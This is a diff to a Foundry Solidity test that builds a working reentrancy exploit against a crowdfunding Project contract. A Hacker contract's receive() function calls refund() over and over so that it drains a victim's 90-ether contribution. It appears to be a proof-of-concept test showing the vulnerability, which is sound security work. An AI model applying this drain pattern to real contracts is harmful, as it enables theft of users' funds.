@@ -9,32 +9,55 @@ import "forge-std/test.sol";
 
 contract TestReentrancy is Test {
 
+    Hacker hacker = new Hacker();
+    address creator = address(0x2);
+    address victim = address(0x3);
     Project project;
-    uint iterations = 0;
 
     function setUp() public {
+        
+        vm.deal(creator, 1 ether);
+        vm.deal(victim, 200 ether);
+        vm.deal(address(hacker), 10 ether);
 
+        vm.startPrank(creator);
         ProjectFactory factory = new ProjectFactory();
-        project = Project(factory.create(100 ether, "Test", "TST"));
-        vm.deal(address(project), 1 ether);
+        project = Project(factory.create(100 ether, "vulnerable", "REENT"));
+        vm.stopPrank();
+       
     }
 
     function testReentrancy() public { 
-        vm.deal(address(this), 0.02 ether);
-        project.contribute{value: 0.02 ether}();
-        vm.warp(block.timestamp + 31 days); // warp to after deadline
+        
+        // victim donates 90 eth
+        vm.startPrank(victim);
+        project.contribute{value: 90 ether}();
+        vm.stopPrank();
+
+        // hacker donates 1 eth
+        vm.startPrank(address(hacker));
+        project.contribute{value: 1 ether}();
+
+
+        // project fails
+        vm.warp(block.timestamp + 31 days);
+
+
+        // hacker withdraws
         project.refund();
 
-        assertTrue((address(this).balance > 0.02 ether), "We should have earned some eth");
-
+        assertTrue(address(hacker).balance > 10);
+        
     }
+}
+
+
+contract Hacker {
 
     receive() external payable {
-        // console.log('current balance = ', address(this).balance);
-        try project.refund() {
-
-        } catch (bytes memory) {
-            return;
+        if (msg.sender.balance > 0) {
+            Project proj = Project(msg.sender);
+            proj.refund();
         }
     }
 }
